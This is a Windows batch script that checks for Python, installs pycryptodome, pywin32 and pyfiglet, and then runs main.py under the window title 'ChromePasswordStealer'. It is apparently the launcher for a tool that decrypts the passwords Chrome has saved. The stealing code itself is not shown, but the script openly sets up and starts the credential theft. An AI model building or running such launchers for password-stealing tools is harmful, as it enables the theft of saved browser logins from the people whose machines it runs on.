@echo off
cd /d %~dp0

title Checking Python installation...
python --version > nul 2>&1
if %errorlevel% neq 0 (
    echo Python is not installed! (Go to https://www.python.org/downloads and install the latest version.^)
    echo Make sure it is added to PATH.
    goto ERROR
)

title Checking libraries...
echo Checking 'pycryptodome' (1/5)
python -c "import Crypto.Cipher" > nul 2>&1
if %errorlevel% neq 0 (
    echo Installing pycryptodome...
    python -m pip install pycryptodome > nul
)

echo Checking 'pywin32' (2/5)
python -c "import win32crypt" > nul 2>&1
if %errorlevel% neq 0 (
    echo Installing pywin32...
    python -m pip install pywin32 > nul
)

echo Checking 'pyfiglet' (3/5)
python -c "import pyfiglet" > nul 2>&1
if %errorlevel% neq 0 (
    echo Installing pyfiglet...
    python -m pip install pyfiglet > nul
)

echo Checking 'sqlite3' (4/5)
python -c "import sqlite3" > nul 2>&1
if %errorlevel% neq 0 (
    echo SQLite3 should be included with Python, no need to install separately.
)

echo Checking 'base64' (5/5)
python -c "import base64" > nul 2>&1
if %errorlevel% neq 0 (
    echo Base64 should be included with Python, no need to install separately.
)

cls
title Running the ChromePasswordStealer...
python main.py
if %errorlevel% neq 0 goto ERROR
exit

:ERROR
color 4 && title [Error]
pause > nul